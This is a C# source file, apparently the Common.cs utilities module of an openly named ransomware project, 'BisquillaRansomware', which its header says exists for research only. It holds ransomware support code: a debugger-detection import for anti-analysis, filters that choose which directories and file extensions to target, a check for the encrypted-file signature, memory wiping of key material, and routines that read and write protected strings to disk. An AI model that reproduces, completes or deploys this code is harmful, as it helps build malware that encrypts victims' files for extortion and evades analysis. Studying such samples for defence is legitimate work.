/************************************************************************************************************
 * This code is created and maintened only for a research proposal. Please do not use for other proposes.   *
 * Author: Th3 0bservator                                                                                   *
 * Source: https://github.com/guibacellar/BisquillaRansomware                                               *
 * Site: https://www.theobservator.net                                                                      *
 ************************************************************************************************************/

using KeePassLib.Security;
using KeePassLib.Utility;
using System;
using System.Globalization;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;

namespace BisquillaRansomware
{
    /// <summary>
    /// Common Stufs
    /// </summary>
    public sealed class Common
    {
        private Common() { }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        /// <summary>
        /// Global Randomizer
        /// </summary>
        public static readonly Random random = new Random();

        /// <summary>
        /// Clear Array Content from Memory
        /// </summary>
        /// <param name="array"></param>
        public static void ClearArray(ref byte[] array)
        {
            for (int i = 0; i < array.Length; i++)
            {
                array[i] = (byte)random.Next(0, 255);
            }
        }

        /// <summary>
        /// Clear String Content from Memory
        /// </summary>
        /// <param name="array"></param>
        public static unsafe void ClearString(ref string str)
        {
            if (str == null) { return; }

            int strLen = str.Length;

            fixed (char* ptr = str)
            {
                for (int i = 0; i < strLen; i++)
                {
                    ptr[i] = (char)random.Next(0, 255);
                }
            }
        }

        /// <summary>
        /// Open a Secure String
        /// </summary>
        /// <param name="dest"></param>
        /// <param name="source"></param>
       public static void OpenSecureString(ref String dest, ref ProtectedString source)
        {
            dest = source.ReadString();
        }


        /// <summary>
        /// Check File Signature VS Encripted File Signature
        /// </summary>
        /// <param name="info"></param>
        /// <returns></returns>
        public static Boolean CheckSignature(FileInfo file)
        {
            Boolean result = true;

            using (FileStream fs = File.OpenRead(file.FullName))
            {
                byte[] bData = new byte[ConfigurationManager.FILE_SIGNATURE_SIZE];
                fs.Read(bData, 0, bData.Length);

                // Compare
                for (int i = 0; i < ConfigurationManager.FILE_SIGNATURE_SIZE; i++)
                {
                    if (!(bData[i] == ConfigurationManager.FILE_SIGNATURE[i]))
                    {
                        result = false;
                        break;
                    }
                }
            }

            return result;
        }


        /// <summary>
        /// Check if a Path is in a Global Filter
        /// </summary>
        /// <param name="fullName"></param>
        /// <returns></returns>
        public static bool DirectoryInFilter(string fullName)
        {
            // Basic Override
            if (ConfigurationManager.TARGET_PATH_FILTER == null) { return true; }

            String normalizedPath = fullName.ToUpper(CultureInfo.CurrentCulture);

            foreach (String item in ConfigurationManager.TARGET_PATH_FILTER)
            {
                if (normalizedPath.Contains(item))
                {
                    return true;
                }
            }

            return false;
        }


        /// <summary>
        /// Check if a Path is in a Global Filter
        /// </summary>
        /// <param name="fullName"></param>
        /// <returns></returns>
        public static bool FileInFilter(string fileExtension)
        {
            string normalizedExtension = fileExtension.ToUpper(CultureInfo.CurrentCulture);

            foreach (string item in ConfigurationManager.TARGET_FILES)
            {
                if (normalizedExtension == item)
                {
                    return true;
                }
            }

            return false;
        }

        /// <summary>
        /// Read File into a ProtectedString
        /// </summary>
        /// <param name="filePath">Source File Path</param>
        /// <param name="destination">Destination ProtectedString reference</param>
        public static void ReadFileToProtectedString(String filePath, ref ProtectedString destination)
        {
            using (FileStream fs = File.OpenRead(filePath))
            {
                // Read
                byte[] unsecureArray = new byte[fs.Length];
                fs.Read(unsecureArray, 0, unsecureArray.Length);

                // To String
                string unsecureData = Encoding.ASCII.GetString(unsecureArray);
                Common.ClearArray(ref unsecureArray);

                // To SecureString
                byte[] pbUtf8 = StrUtil.Utf8.GetBytes(unsecureData);
                Common.ClearString(ref unsecureData);

                destination = new ProtectedString(true, pbUtf8);
                Common.ClearArray(ref pbUtf8);
            }
        }

        /// <summary>
        /// Save Protected String Content into Destination File
        /// </summary>
        /// <param name="path">Destination Path</param>
        /// <param name="source">Source ProtectedString</param>
        public static void SaveProtectedStringIntoFile(String path, ref ProtectedString source)
        {
            // Save Into File
            using (FileStream fs = new FileStream(path, FileMode.Create))
            {
                // To Array
                Byte[] unsecureArray = ASCIIEncoding.ASCII.GetBytes(source.ReadString());

                // To File
                fs.Write(unsecureArray, 0, unsecureArray.Length);
                Common.ClearArray(ref unsecureArray);

                // Flush to Disk
                fs.Flush();
            }
        }
    }
}
